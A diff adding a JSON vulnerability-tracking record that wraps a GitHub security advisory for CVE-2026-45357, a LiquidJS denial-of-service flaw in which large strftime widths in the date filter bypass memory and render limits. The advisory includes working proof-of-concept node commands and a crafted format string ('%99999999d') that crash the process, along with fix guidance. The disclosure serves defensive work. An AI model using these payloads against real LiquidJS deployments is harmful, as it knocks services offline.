@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}, {\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/98734964?v=4\", \"events_url\": \"https://api.github.com/users/0xEr3n/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/0xEr3n/followers\", \"following_url\": \"https://api.github.com/users/0xEr3n/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/0xEr3n/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/0xEr3n\", \"id\": 98734964, \"login\": \"0xEr3n\", \"node_id\": \"U_kgDOBeKTdA\", \"organizations_url\": \"https://api.github.com/users/0xEr3n/orgs\", \"received_events_url\": \"https://api.github.com/users/0xEr3n/received_events\", \"repos_url\": \"https://api.github.com/users/0xEr3n/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/0xEr3n/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/0xEr3n/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/0xEr3n\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45357\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}], \"description\": \"## Summary\\n\\nThe `date` filter's strftime implementation parses width specifiers like `%9999999d` and forwards the captured width unchecked into `pad()`/`padStart()` in `src/util/underscore.ts`. The pad loop performs unbounded string concatenation without consulting the Context's `memoryLimit` or `renderLimit`, so a single small template (`{{ x | date: '%5000000d' }}`) produces megabytes of output and unbounded CPU. The `memoryLimit` and `renderLimit` options the docs (`src/liquid-options.ts:87-92`) advertise as DoS controls — and which the docstring explicitly mentions for `strftime` — are entirely bypassed.\\n\\n## Details\\n\\n`date.ts:5-13` only charges `memoryLimit` for the lengths of the input value, format string, and timezone:\\n\\n```ts\\nexport function date (this: FilterImpl, v: string | Date, format?: string, timezoneOffset?: number | string) {\\n  const size = ((v as string)?.length ?? 0) + (format?.length ?? 0) + ((timezoneOffset as string)?.length ?? 0)\\n  this.context.memoryLimit.use(size)\\n  ...\\n  return strftime(date, format)\\n}\\n```\\n\\n`strftime` (`src/util/strftime.ts:121`) then walks the format with `rFormat = /%([-_0^#:]+)?(\\\\d+)?([EO])?(.)/`. The captured `width` group is passed directly to `padStart`:\\n\\n```ts\\nfunction format (d, match) {\\n  const [input, flagStr = '', width, modifier, conversion] = match\\n  ...\\n  let padWidth = width || padWidths[conversion] || 0\\n  ...\\n  return padStart(ret, padWidth, padChar)   // strftime.ts:147\\n}\\n```\\n\\n`padStart` calls `pad()` in `src/util/underscore.ts:153`:\\n\\n```ts\\nexport function pad (str, length, ch, add) {\\n  str = String(str)\\n  let n = length - str.length\\n  while (n-- > 0) str = add(str, ch)   // unbounded loop\\n  return str\\n}\\n```\\n\\nThe loop has no upper bound and never consults `this.context.memoryLimit` or `renderLimit`. The pad is also implemented as repeated `ch + str` string concatenation, which makes the per-byte cost grow with output length and amplifies CPU consumption.\\n\\nFilter arguments accept context-evaluated values (`src/template/filter.ts:30-31`, `evalToken(arg, context)`), so any deployment that passes a context value as the date format — a documented and tested usage pattern — exposes the sink to attacker-controlled input.\\n\\nThis is a separate sink from the previously-reported quadratic `replace` finding: a different filter (`date`), a different parser (the strftime width regex), and a different concatenation site (`pad()` in `underscore.ts`).\\n\\n## PoC\\n\\nSetup: `npm install liquidjs@10.25.7`.\\n\\nStep 1 — bypass `memoryLimit` and `renderLimit` (5 MB output, ~200 ms, both limits set to 50):\\n\\n```bash\\nnode -e \\\"\\nconst { Liquid } = require('liquidjs');\\nconst liquid = new Liquid({ memoryLimit: 50, renderLimit: 50 });\\nconst t0 = Date.now();\\nconst out = liquid.parseAndRenderSync('{{ d | date: f }}', { d: 'now', f: '%5000000d' });\\nconsole.log('len=', out.length, 'ms=', Date.now()-t0);\\n\\\"\\n```\\n\\nVerified output: `len= 5000000 ms= 198`. The `memoryLimit:50` (50-byte budget) and `renderLimit:50` (50 ms budget) are both ignored.\\n\\nStep 2 — OOM-kill the Node process under a 200 MB heap cap:\\n\\n```bash\\nnode --max-old-space-size=200 -e \\\"\\nconst { Liquid } = require('liquidjs');\\nconst liquid = new Liquid({ memoryLimit: 50, renderLimit: 50 });\\nliquid.parseAndRenderSync('{{ d | date: f }}', { d: 'now', f: '%99999999d' });\\n\\\"\\n```\\n\\nVerified output: `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`. Process is killed.\\n\\nThe realistic attack template is `{{ post.created_at | date: user_supplied_format }}`, where `user_supplied_format` is any context value an attacker can influence (profile field, query param mapped into template context, etc.).\\n\\n## Impact\\n\\n- DoS against any LiquidJS-rendered surface where a context value reaches the `date` filter's format argument: a single render call can be turned into multi-MB allocations and seconds of CPU per request, or into an OOM that crashes the host process.\\n- Bypass of the engine's two documented DoS controls — `memoryLimit` and `renderLimit` — meaning that operators who explicitly opted into DoS protection still have no defense for this code path.\\n- All `date_to_xmlschema`, `date_to_rfc822`, `date_to_string`, `date_to_long_string` paths share the same sink via `strftime`, but with hard-coded formats they're not directly attacker-controllable; the user-facing risk is on `date`.\\n\\n## Recommended Fix\\n\\nTwo complementary fixes:\\n\\n1. Have `pad()` in `src/util/underscore.ts` charge the Context's memory limit and use `String.prototype.repeat` instead of an O(n) concatenation loop. Since `pad()` is generic, the simplest version takes the memory limit as a parameter:\\n\\n```ts\\nexport function pad (str: any, length: number, ch: string, add: (str: string, ch: string) => string) {\\n  str = String(str)\\n  const n = length - str.length\\n  if (n <= 0) return str\\n  return add === ((s, c) => c + s)\\n    ? ch.repeat(n) + str\\n    : str + ch.repeat(n)\\n}\\n```\\n\\n2. Cap `padWidth` in `src/util/strftime.ts:141` and account for it via `memoryLimit`. The `date` filter (`src/filters/date.ts`) should also charge `this.context.memoryLimit.use(parsedMaxWidth)` before invoking `strftime`, e.g. by scanning the format for `%(\\\\d+)` widths and summing them. A conservative cap (e.g. `Math.min(width, 1024)` for non-`N` conversions) is also reasonable — strftime widths beyond a few dozen characters have no legitimate use.\\n\\nBoth fixes are needed: the cap stops the OOM crash, the memory accounting restores the documented DoS guarantee.\", \"epss\": {\"percentage\": 0.00385, \"percentile\": 0.30506}, \"ghsa_id\": \"GHSA-hh27-hf48-9f5q\", \"github_reviewed_at\": \"2026-05-27T17:33:52Z\", \"html_url\": \"https://github.com/advisories/GHSA-hh27-hf48-9f5q\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hh27-hf48-9f5q\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45357\"}], \"nvd_published_at\": \"2026-06-17T23:17:03Z\", \"published_at\": \"2026-05-27T17:33:52Z\", \"references\": [\"https://github.com/harttle/liquidjs/security/advisories/GHSA-hh27-hf48-9f5q\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45357\", \"https://github.com/harttle/liquidjs/commit/3129d46dc95efa357b00e5a57ee1af80a13d72ed\", \"https://github.com/harttle/liquidjs/releases/tag/v10.26.0\", \"https://github.com/advisories/GHSA-hh27-hf48-9f5q\"], \"repository_advisory_url\": \"https://api.github.com/repos/harttle/liquidjs/security-advisories/GHSA-hh27-hf48-9f5q\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/harttle/liquidjs\", \"summary\": \"LiquidJS has a memory and render limit bypass via unbounded width padding in `date` filter (strftime)\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-09T21:06:31Z\", \"url\": \"https://api.github.com/advisories/GHSA-hh27-hf48-9f5q\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"npm\", \"name\": \"liquidjs\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 10.25.7\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hh27-hf48-9f5q",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "liquidjs: <= 10.25.7"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-45357"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "liquidjs"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.396652Z",
+  "provenance": {
+    "content_sha256": "dfb3d201f5c8fa2c55ed5fc9b3adeb10bcbe4bc21b2369b39a540285d200896f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-27T17:33:52Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hh27-hf48-9f5q",
+  "status": "active",
+  "title": "LiquidJS has a memory and render limit bypass via unbounded width padding in `date` filter (strftime)",
+  "updated_at": "2026-07-09T21:06:31Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hh27-hf48-9f5q"
+}
